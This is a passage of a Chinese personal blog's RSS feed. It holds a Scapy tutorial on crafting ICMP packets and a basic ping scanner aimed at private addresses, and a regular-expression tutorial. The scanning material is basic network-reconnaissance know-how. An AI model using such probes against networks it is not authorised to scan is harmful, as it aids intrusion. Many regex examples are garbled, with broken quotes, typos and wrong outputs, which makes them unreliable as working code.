<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>yym&#39;s blog</title>
    <link>http://www.yym.show/</link>
    
    <atom:link href="/rss2.html" rel="self" type="application/rss+xml"/>
    
    <description>hello world</description>
    <pubDate>Wed, 22 Jul 2020 01:25:48 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>python多线程与多进程</title>
      <link>http://www.yym.show/2020-07-19-python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B/</link>
      <guid>http://www.yym.show/2020-07-19-python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B/</guid>
      <pubDate>Wed, 22 Jul 2020 01:24:00 GMT</pubDate>
      <description>
      
      </description>
      
      
      <comments>http://www.yym.show/2020-07-19-python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B/#disqus_thread</comments>
    </item>
    
    <item>
      <title>python实现主机扫描探测</title>
      <link>http://www.yym.show/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/</link>
      <guid>http://www.yym.show/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/</guid>
      <pubDate>Sun, 19 Jul 2020 07:53:00 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;一：Scapy介绍&quot;&gt;&lt;a href=&quot;#一：Scapy介绍&quot; class=&quot;headerlink&quot; title=&quot;一：Scapy介绍&quot;&gt;&lt;/a&gt;一：Scapy介绍&lt;/h2&gt;&lt;p&gt;Scapy是一个Python程序，使用户能够发送，嗅探和剖析并伪造网络数据包。此功能
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="一：Scapy介绍"><a href="#一：Scapy介绍" class="headerlink" title="一：Scapy介绍"></a>一：Scapy介绍</h2><p>Scapy是一个Python程序，使用户能够发送，嗅探和剖析并伪造网络数据包。此功能允许构建可以探测，扫描或攻击网络的工具。</p><p>换句话说，Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送，捕获它们，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现。它可以取代hping，arpspoof，arp-sk，arping，p0f甚至是Nmap，tcpdump和tshark的某些部分。</p><h3 id="1-产生一个PING包"><a href="#1-产生一个PING包" class="headerlink" title="1.产生一个PING包"></a>1.产生一个PING包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PING &#x3D; sr1(IP(dst&#x3D;&#39;10.20.30.134&#39;)&#x2F;ICMP()&#x2F;b&#39;hello word&#39;)</span><br><span class="line">&#x2F;&#x2F; 这句话的意思，创建一个 PING包，然后发送数据包，然后把得到的回应赋值给PING变量</span><br><span class="line">&#x2F;&#x2F; 首先创建一个变量 PING ，然后 sr1 的意思是 s 是发送，r 是接收，1 是接收一个包</span><br><span class="line">&#x2F;&#x2F; ip(dst &#x3D; &#39;10.20.30.134&#39;)设置数据包表示设置目的地址为10.20.30.134，然后设置协议为ICMP，&#x2F;b&#39;hello word&#39; 设置数据内容hello word</span><br></pre></td></tr></table></figure><p>查看生成的数据包：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b &#x3D; IP(dst&#x3D;&#39;10.20.30.134&#39;)&#x2F;ICMP()&#x2F;b&#39;hello word&#39;</span><br><span class="line">b.show()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8Bimage-20200721101250401.png" alt="image-20200721101250401"></p><p>发送包然后接收返回的包：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PING &#x3D; sr1(b)</span><br><span class="line">PING.show()           &#x2F;&#x2F;查看接收到的包</span><br><span class="line">&#x2F;&#x2F;type&#x3D; echo-reply说明这是接收包</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8Bimage-20200721102207589.png" alt="image-20200721102207589"></p><h3 id="2-Scapy分析回应包"><a href="#2-Scapy分析回应包" class="headerlink" title="2.Scapy分析回应包"></a>2.Scapy分析回应包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PING.getlayer(ICMP).fields</span><br><span class="line">&#x2F;&#x2F; getlayer显示具体的网络层的信息，提取ICMP的头部</span><br><span class="line">&#x2F;&#x2F; .fields表示把ICMP的头部字段提取出来产生一个字典</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8Bimage-20200721103928151.png" alt="image-20200721103928151"></p><p>然后就能提取特定字段，比如说提取<code>ID</code>字段，或者其他字段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PING.getlayer(ICMP).fields[‘id’]</span><br><span class="line">PING.getlayer(ICMP).fields[‘chksum’]</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8Bimage-20200721104628345.png" alt="image-20200721104628345"></p><h3 id="3-收发数据包介绍"><a href="#3-收发数据包介绍" class="headerlink" title="3.收发数据包介绍"></a>3.收发数据包介绍</h3><h4 id="sr"><a href="#sr" class="headerlink" title="sr()"></a>sr()</h4><p>发送三层数据包，等待一个或者多个数据包的响应</p><h4 id="sr1"><a href="#sr1" class="headerlink" title="sr1()"></a>sr1()</h4><p>发送三层数据包，并仅仅只等待接收一个数据包的响应</p><h4 id="srp"><a href="#srp" class="headerlink" title="srp()"></a>srp()</h4><p>发送二层数据包，并且等待响应</p><h4 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h4><p>仅仅发送三层数据包，系统会自送处理路由有二层信息</p><h4 id="sendp"><a href="#sendp" class="headerlink" title="sendp()"></a>sendp()</h4><p>发送二层数据包（只发送。不接受回应）</p><h2 id="二：Scapy实现Ping扫描"><a href="#二：Scapy实现Ping扫描" class="headerlink" title="二：Scapy实现Ping扫描"></a>二：Scapy实现Ping扫描</h2><h3 id="1-ICMP-Echo包分析"><a href="#1-ICMP-Echo包分析" class="headerlink" title="1.ICMP Echo包分析"></a>1.ICMP Echo包分析</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8Bimage-20200721142524453.png" alt="image-20200721142524453"></p><p><strong>IP协议报文格式：</strong></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B20171118172527691" alt="img"></p><p><strong>ICMP协议报文格式：</strong></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B20170620101458040" alt="img"></p><h3 id="2-使用Scapy生成ping扫描器"><a href="#2-使用Scapy生成ping扫描器" class="headerlink" title="2.使用Scapy生成ping扫描器"></a>2.使用Scapy生成ping扫描器</h3><p><strong>单个PING：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">#导入scap所有的内容</span><br><span class="line">import random</span><br><span class="line">#导入随机数模块</span><br><span class="line">def scapy_ping_one(host):</span><br><span class="line">    id_ip &#x3D; random.randint(1,65535)    #随机产生IP的ID位，random.randint(1,65535)随机产生一个1~65535整数</span><br><span class="line">    id_ping &#x3D; random.randint(1,65535)  #随机产生ping ID位</span><br><span class="line">    seq_ping &#x3D; random.randint(1,65535) ##随机产生ping序列号位</span><br><span class="line">    packet &#x3D; IP(dst&#x3D;host,ttl&#x3D;64,id&#x3D;id_ip)&#x2F;ICMP(id&#x3D;id_ping,seq&#x3D;seq_ping)&#x2F;b&#39;Hello word&#39;</span><br><span class="line">    #这里IP和ICMP有报错，不过不影响</span><br><span class="line">    result &#x3D; sr1(packet)</span><br><span class="line">    result.show()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    scapy_ping_one(&#39;192.168.31.1&#39;)</span><br></pre></td></tr></table></figure><p><strong>PING扫描器（多线程）：</strong></p><h2 id="三：Scapy实现ARP扫描"><a href="#三：Scapy实现ARP扫描" class="headerlink" title="三：Scapy实现ARP扫描"></a>三：Scapy实现ARP扫描</h2><h2 id="四：Scapy实现TCP端口扫描"><a href="#四：Scapy实现TCP端口扫描" class="headerlink" title="四：Scapy实现TCP端口扫描"></a>四：Scapy实现TCP端口扫描</h2><h2 id="五：Scapy实现UDP端口扫描"><a href="#五：Scapy实现UDP端口扫描" class="headerlink" title="五：Scapy实现UDP端口扫描"></a>五：Scapy实现UDP端口扫描</h2><h2 id="六：Scapy实现防火墙开放端口扫描"><a href="#六：Scapy实现防火墙开放端口扫描" class="headerlink" title="六：Scapy实现防火墙开放端口扫描"></a>六：Scapy实现防火墙开放端口扫描</h2><h2 id="七：Scapy实现DHCP扫描"><a href="#七：Scapy实现DHCP扫描" class="headerlink" title="七：Scapy实现DHCP扫描"></a>七：Scapy实现DHCP扫描</h2><h2 id="八：NMAP实现Ping扫描"><a href="#八：NMAP实现Ping扫描" class="headerlink" title="八：NMAP实现Ping扫描"></a>八：NMAP实现Ping扫描</h2><h2 id="九：NMAP实现综合扫描"><a href="#九：NMAP实现综合扫描" class="headerlink" title="九：NMAP实现综合扫描"></a>九：NMAP实现综合扫描</h2>]]></content:encoded>
      
      <comments>http://www.yym.show/python%E5%AE%9E%E7%8E%B0%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/#disqus_thread</comments>
    </item>
    
    <item>
      <title>正则表达式基础</title>
      <link>http://www.yym.show/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80/</link>
      <guid>http://www.yym.show/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80/</guid>
      <pubDate>Sun, 19 Jul 2020 04:33:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;简单写一下正则表达式的一些基础点：&lt;/p&gt;
&lt;h3 id=&quot;基础规则&quot;&gt;&lt;a href=&quot;#基础规则&quot; class=&quot;headerlink&quot; title=&quot;基础规则&quot;&gt;&lt;/a&gt;基础规则&lt;/h3&gt;&lt;h4 id=&quot;一丶转义符&quot;&gt;&lt;a href=&quot;#一丶转义符&quot; class=&quot;h
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>简单写一下正则表达式的一些基础点：</p><h3 id="基础规则"><a href="#基础规则" class="headerlink" title="基础规则"></a>基础规则</h3><h4 id="一丶转义符"><a href="#一丶转义符" class="headerlink" title="一丶转义符"></a>一丶转义符</h4><table><thead><tr><th align="left">表达式</th><th>可匹配</th></tr></thead><tbody><tr><td align="left">\r，\n</td><td>代表回车和换行符</td></tr><tr><td align="left">\t</td><td>制表符</td></tr><tr><td align="left">\</td><td>代表 “\“本身</td></tr><tr><td align="left">^</td><td>匹配^本身</td></tr><tr><td align="left">\$</td><td>匹配$本身</td></tr><tr><td align="left">\.</td><td>匹配小数点(.)本身</td></tr></tbody></table><blockquote><p>re. match(‘ cmd.exe ‘ cmdaexe’)<br>&lt;_sre.SRE_Match object; span=(O, 7), match=’ cmdaexe’&gt;<br>re. match(‘ cmd.exe’ ,’ cmdbexe’)<br>&lt;_sre. SRE_Match object; span=(O, 7), match=’ cmdbexe’&gt;<br>re. match(‘ cmd.exe’ ,’ cmd. exe’)<br>&lt;_sre. SRE_. Match object; span=(0, 7), match=’ cmd. exe’&gt;<br>re. match(‘ cmd.exe’ cmd. exe’)<br>&lt;_sre. SRE_. Match object; span=(0, 7), match=’ cmd. exe’&gt;<br>re. match(‘ cmd.exe’ ,’ cmdaexe’)<br>re. match(‘ cmd.exe ,’ cmdbexe’)</p></blockquote><h4 id="二丶多种字符"><a href="#二丶多种字符" class="headerlink" title="二丶多种字符"></a>二丶多种字符</h4><table><thead><tr><th align="left">表达式</th><th>可匹配</th></tr></thead><tbody><tr><td align="left">\d</td><td>任意一个数字，0-9中的任意一个</td></tr><tr><td align="left">\w</td><td>任意一个字母或数字或下划线，也就是A-Z,a-z，0-9，_中的任意一个</td></tr><tr><td align="left">\s</td><td>包括空格丶制表符丶换页符等空白字符中的其中任意一个</td></tr><tr><td align="left">.</td><td>小数点可以匹配除了换行符(\n)以外的任意一个字符</td></tr></tbody></table><blockquote><p>re. match(“\d\d\d’,’123’)<br>&lt;_sre. SRE__Match object; span=(0, 3), match=’123’&gt;<br>re. match(“\d\d\d’,’12a”)&gt;&gt;&gt; re. match(“\d\d\w’,’12a’)<br>&lt;_sre. SRE_Match object; span=(O, 3), match=’12a’&gt;</p></blockquote><blockquote><p>re. match(‘\s’’)<br>&lt;_sre. SRE_. Match object; span=(0, 1), match=’ ‘&gt;<br>re. match(^\s’,’ ‘)<br>&lt;_sre. SRE_ Match object; span=(0, 1), match=”\t’&gt;<br>re. match(^\s’,’\n’)<br>&lt;_sre. SRE_Match object; span=(0, 1), match=’^\n’&gt;<br>re. match(“\s’\r’)<br>&lt;_sre. SRE_Match object; span=(0, 1), match=”\r’&gt;</p></blockquote><h4 id="三丶自定义多种字符"><a href="#三丶自定义多种字符" class="headerlink" title="三丶自定义多种字符"></a>三丶自定义多种字符</h4><table><thead><tr><th align="left">表达式</th><th>可匹配</th></tr></thead><tbody><tr><td align="left">[ab5@]</td><td>匹配”a”或”b”或”5”或”@”</td></tr><tr><td align="left">[^abc]</td><td>匹配”a”,”b”,”c”之外的任意一个字符</td></tr><tr><td align="left">[f-k]</td><td>匹配”f”-“k”之间的任意一个字符</td></tr><tr><td align="left">[^A-F0-3]</td><td>匹配”A”-“F”,”0”-“3”之外的任意一个字符</td></tr></tbody></table><p>在[]中的开头的^表示取反</p><blockquote><p>re. match(‘a[a-z]c, abc’)D<br>&lt;_sre. SRE_. Match object; span=(0, 3), match=’ abc’&gt;<br>re. match(‘a[a-z]c’,’ adc’)<br>&lt;_sre. SRE_Match object; span=(O, 3), match=’ adc’&gt;<br>re. match(‘a[a-z]c,’a1c’)<br>re. match(‘a[0-9]c’,’a1c’)<br>&lt;_sre. SRE_Match object; span=(0, 3), match=’a1c’&gt;<br>re. match(‘a[^a-z]c’,’a1c’)<br>&lt;_sre. SRE_. Match object; span=(0, 3), match=’a1c’&gt;</p></blockquote><h4 id="四丶匹配次数"><a href="#四丶匹配次数" class="headerlink" title="四丶匹配次数"></a>四丶匹配次数</h4><table><thead><tr><th align="left">表达式</th><th>作用</th></tr></thead><tbody><tr><td align="left">{n}</td><td>表达式重复n次，比如：”\w{2}”相当于”\w\w”;”a{5}”相当于”aaaaa”</td></tr><tr><td align="left">{m,n}</td><td>表达式至少重复m次，最多重复n次</td></tr><tr><td align="left">{m,}</td><td>表达式至少重复m次</td></tr><tr><td align="left">?</td><td>匹配表达式0次或者1次</td></tr><tr><td align="left">+</td><td>表达式至少出现1次</td></tr><tr><td align="left">*</td><td>表达式不出现或出现任意次</td></tr></tbody></table><blockquote><p>re. match(‘ ba(na)?’,’ ba’)<br>&lt;_sre. SRE_Match object; span=(O, 2), match=’ ba’&gt;<br>re. match(‘ ba(na)? ‘, bana’)<br>&lt;_sre. SRE_ Match object; span=(0, 4), match=’ bana’&gt;<br>re. match(‘ ba(na)? ‘, banana’)<br>&lt;_sre. SRE_Match object; span=(0, 4), match=’ bana’&gt;<br>re. match(“ba(na)<em>‘,’ ba’)<br>&lt;_sre. SRE_Match object; span=(0, 2), match=’ ba’&gt;<br>re. match(“ba(na)</em>‘,’ bana’)<br>&lt;_sre. SRE_. Match object; span=(0, 4), match=’ bana’&gt;<br>re. match(‘ ba(na)*’,’ banana’)<br>&lt;_sre. SRE_Match object; span=(0, 6), match=”‘ banana’&gt;</p></blockquote><h4 id="五丶代表抽象意义"><a href="#五丶代表抽象意义" class="headerlink" title="五丶代表抽象意义"></a>五丶代表抽象意义</h4><table><thead><tr><th align="left">表达式</th><th>作用</th></tr></thead><tbody><tr><td align="left">^</td><td>与字符串开始的地方匹配，不匹配任何字符</td></tr><tr><td align="left">$</td><td>与字符串结束的地方匹配，不匹配任何字符</td></tr><tr><td align="left">\b</td><td>匹配一个单词边界，也就是单词和空格之间的位置，不匹配任何字符</td></tr></tbody></table><blockquote><p>re. match(‘^qytang’,’ qytangccies’)<br>&lt;_sre. SRE_ Match object; span=(0, 6), match=’ qytang’&gt;<br>re. match(‘^ccies’,’ qytangccies’)<br>re. match(‘.* ccies$’ qytangccies’)<br>&lt;_sre. SRE_. Match object; span=(0, 11), match=’ qytangccies’&gt;</p></blockquote><h4 id="六丶表达式关系"><a href="#六丶表达式关系" class="headerlink" title="六丶表达式关系"></a>六丶表达式关系</h4><table><thead><tr><th align="left">表达式</th><th>作用</th></tr></thead><tbody><tr><td align="left">|</td><td>左右两边表达式之间”或“关系，匹配左边或者右边</td></tr><tr><td align="left">()</td><td>（1）在被修饰匹配次数的时候，括号中的表达式可以作为整体被修饰<br />（2）取匹配结果的时候，括号中的表达式匹配到的内容可以被单独得到</td></tr></tbody></table><blockquote><p>re. match(root Root’ root’)<br>&lt;_sre. SRE_Match object; span=(O, 4), match=’ root’&gt;<br>re. match(‘ root | Root , Root’)<br>&lt;_sre. SRE_Match object; span=(0, 4), match=’ Root’&gt;</p></blockquote><h3 id="python中几个重要的正则表达式方法"><a href="#python中几个重要的正则表达式方法" class="headerlink" title="python中几个重要的正则表达式方法"></a>python中几个重要的正则表达式方法</h3><p>使用re模块</p><h4 id="1丶split"><a href="#1丶split" class="headerlink" title="1丶split"></a>1丶split</h4><p>用于分段匹配</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re.splt(---&#39;,&#39;aaa---bb---ccc&#39;)</span><br><span class="line">&#x2F;&#x2F;&#x2F;[&#39;aaa&#39;,&#39;bbb&#39;,&#39;ccc&#39;]</span><br></pre></td></tr></table></figure><h4 id="2丶用于替换"><a href="#2丶用于替换" class="headerlink" title="2丶用于替换"></a>2丶用于替换</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re.sub(&#39;--&#39;,&#39;...&#39;,&#39;aaa--bbb--ccc&#39;)</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#39;aaa...bbb...ccc&#39;</span><br></pre></td></tr></table></figure><h4 id="3丶用于分段匹配"><a href="#3丶用于分段匹配" class="headerlink" title="3丶用于分段匹配"></a>3丶用于分段匹配</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re.split(&#39;[-&#x3D;]&#39;,&#39;aaa-bbb&#x3D;ccc&#39;)</span><br><span class="line">&#x2F;&#x2F;&#x2F;[&#39;aaa&#39;,&#39;bbb&#39;,&#39;ccc&#39;]</span><br></pre></td></tr></table></figure><h4 id="4丶re-match（固定提取）"><a href="#4丶re-match（固定提取）" class="headerlink" title="4丶re.match（固定提取）"></a>4丶re.match（固定提取）</h4><p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</p><p><strong>函数语法</strong>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re.match(pattern, string, flags&#x3D;0)</span><br></pre></td></tr></table></figure><p>函数参数说明：</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">pattern</td><td align="left">匹配的正则表达式</td></tr><tr><td align="left">string</td><td align="left">要匹配的字符串。</td></tr><tr><td align="left">flags</td><td align="left">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td></tr></tbody></table><p>匹配成功re.search方法返回一个匹配的对象，否则返回None。</p><p>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p><blockquote><p>str1 = ‘ spam/ham/eggs’<br>str1. split(/“)<br>[‘ spam’, ‘ ham’, ‘ eggs’]<br>re. match(“(.<em>)/(.</em>)/(.<em>)’, str1). groups()<br>(‘ spam’, ‘ ham’, ‘ eggs’)<br>str2 = ‘<spam>/<ham>/<eggs>‘<br>re. match(‘&lt;(.</em>)&gt;/&lt;(.<em>)&gt;/&lt;(.</em>)&gt;’, str2). groups()<br>(‘ spam’, ‘ ham’, eggs’)</p></blockquote><blockquote><p>str3=’ <spam>/<ham><eggs>‘<br>re. match(“\s*&lt;(.*)&gt;/?&lt;(.*)&gt;/?&lt;.*)&gt;’, str2). groups()<br>(‘ spam’, ‘ ham’, ‘ eggs’)<br>str4 = ‘ Hello pattern world!’<br>str4. split()<br>[‘ Hello’, ‘ pattern’, ‘ world!’]<br>str5 = ‘ Hellopattern world !’<br>re. match(‘ Hello\s*([a-z]*)\s+(.*)\s*!’, str5 ). groups()<br>(‘ pattern’, ‘ world’)</p></blockquote><p><strong>例题：</strong></p><p>匹配路由器的show ip biref内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">str1 &#x3D; ‘Port-channel1.189 192.168.1.1 YES CONFIG up’</span><br><span class="line">result &#x3D; re.match(&#39;\s*(\w.*\d)\s+(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\s+(\w*)\s+(\w*)\s+(\w*)\s+(\w*)\s*&#39;,str1).groups()</span><br><span class="line">## \s*表示空白或者没有空白，*表示出现0次或多次，\s+表示至少匹配一次空白</span><br><span class="line">print(&#39;_&#39;*80)</span><br><span class="line">print(%-7s : %s&#39; % (&#39;接口&#39;,result[0]))</span><br><span class="line">print(%-7s : %s&#39; % (&#39;IP地址&#39;,result[1]))</span><br><span class="line">print(%-7s : %s&#39; % (&#39;状态&#39;,result[4]))</span><br></pre></td></tr></table></figure><h4 id="5丶re-findall（匹配所有）"><a href="#5丶re-findall（匹配所有）" class="headerlink" title="5丶re.findall（匹配所有）"></a>5丶re.findall（匹配所有）</h4><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</p><p><strong>注意：</strong> match 和 search 是匹配一次 findall 匹配所有。</p><p>语法格式为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">findall(string[, pos[, endpos]])</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><strong>string</strong> : 待匹配的字符串。</li><li><strong>pos</strong> : 可选参数，指定字符串的起始位置，默认为 0。</li><li><strong>endpos</strong> : 可选参数，指定字符串的结束位置，默认为字符串的长度。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:UTF8 -*-</span><br><span class="line"> </span><br><span class="line">import re</span><br><span class="line"> </span><br><span class="line">pattern &#x3D; re.compile(r&#39;\d+&#39;)   # 查找数字</span><br><span class="line">result1 &#x3D; pattern.findall(&#39;runoob 123 google 456&#39;)</span><br><span class="line">result2 &#x3D; pattern.findall(&#39;run88oob123google456&#39;, 0, 10)</span><br><span class="line"> </span><br><span class="line">print(result1)</span><br><span class="line">print(result2)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;123&#39;, &#39;456&#39;]</span><br><span class="line">[&#39;88&#39;, &#39;12&#39;]</span><br></pre></td></tr></table></figure><blockquote><p>str1 =’<spam>/<ham>/<eggs>‘<br>str1.find（’ham’）#找到出现问位置<br>8<br>re.findall（’&lt;（.*？）&gt;’，str1）<br>[‘spam’，’ham’，eggs’]<br>str2 =’<spam>/<ham>/<eggs>‘</p><p>re.findall（’&lt;（.*？）&gt;’，str2）<br>[‘spam’，’ham’，’eggs’]</p></blockquote><h4 id="6丶re-search"><a href="#6丶re-search" class="headerlink" title="6丶re.search"></a>6丶re.search</h4><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p><p>函数语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re.search(pattern, string, flags&#x3D;0)</span><br></pre></td></tr></table></figure><p>函数参数说明：</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">pattern</td><td align="left">匹配的正则表达式</td></tr><tr><td align="left">string</td><td align="left">要匹配的字符串。</td></tr><tr><td align="left">flags</td><td align="left">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td></tr></tbody></table><p>匹配成功re.search方法返回一个匹配的对象，否则返回None。</p><p>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p><table><thead><tr><th align="left">匹配对象方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">group(num=0)</td><td align="left">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td></tr><tr><td align="left">groups()</td><td align="left">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: UTF-8 -*- </span><br><span class="line"> </span><br><span class="line">import re</span><br><span class="line">print(re.search(&#39;www&#39;, &#39;www.runoob.com&#39;).span())  # 在起始位置匹配</span><br><span class="line">print(re.search(&#39;com&#39;, &#39;www.runoob.com&#39;).span())         # 不在起始位置匹配</span><br></pre></td></tr></table></figure><p>以上实例运行输出结果为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(0, 3)</span><br><span class="line">(11, 14)</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">import re</span><br><span class="line"> </span><br><span class="line">line &#x3D; &quot;Cats are smarter than dogs&quot;;</span><br><span class="line"> </span><br><span class="line">searchObj &#x3D; re.search( r&#39;(.*) are (.*?) .*&#39;, line, re.M|re.I)</span><br><span class="line"> </span><br><span class="line">if searchObj:</span><br><span class="line">   print &quot;searchObj.group() : &quot;, searchObj.group()</span><br><span class="line">   print &quot;searchObj.group(1) : &quot;, searchObj.group(1)</span><br><span class="line">   print &quot;searchObj.group(2) : &quot;, searchObj.group(2)</span><br><span class="line">else:</span><br><span class="line">   print &quot;Nothing found!!&quot;</span><br></pre></td></tr></table></figure><p>以上实例执行结果如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchObj.group() :  Cats are smarter than dogs</span><br><span class="line">searchObj.group(1) :  Cats</span><br><span class="line">searchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure><h4 id="7丶re-compile-函数"><a href="#7丶re-compile-函数" class="headerlink" title="7丶re.compile 函数"></a>7丶re.compile 函数</h4><p>compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p><p>语法格式为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re.compile(pattern[, flags])</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><strong>pattern</strong> : 一个字符串形式的正则表达式</li><li><strong>flags</strong> : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：<ol><li><strong>re.I</strong> 忽略大小写</li><li><strong>re.L</strong> 表示特殊字符集 \w, \W, \b, \B, \s, \S 依赖于当前环境</li><li><strong>re.M</strong> 多行模式</li><li><strong>re.S</strong> 即为 <strong>.</strong> 并且包括换行符在内的任意字符（<strong>.</strong> 不包括换行符）</li><li><strong>re.U</strong> 表示特殊字符集 \w, \W, \b, \B, \d, \D, \s, \S 依赖于 Unicode 字符属性数据库</li><li><strong>re.X</strong> 为了增加可读性，忽略空格和 <strong>#</strong> 后面的注释</li></ol></li></ul><p><strong>实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;import re</span><br><span class="line">&gt;&gt;&gt; pattern &#x3D; 